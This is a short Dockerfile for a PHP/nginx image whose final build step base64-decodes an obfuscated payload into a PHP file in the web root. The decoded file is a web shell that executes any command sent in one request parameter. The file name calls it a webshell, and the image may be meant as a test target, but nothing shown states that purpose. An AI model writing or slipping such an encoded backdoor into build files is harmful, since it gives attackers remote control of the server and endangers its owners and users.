FROM trafex/php-nginx

ARG COMMIT_SHA
ENV COMMIT_SHA $COMMIT_SHA

RUN echo "=========="
RUN echo "PD9waHAKZXhlYygiJF9SRVFVRVNUWydtYWxsZW9vYTAxOTJyciddIik7Cj8+Cg==" | base64 -d > /var/www/html/ey_webshell_19991.php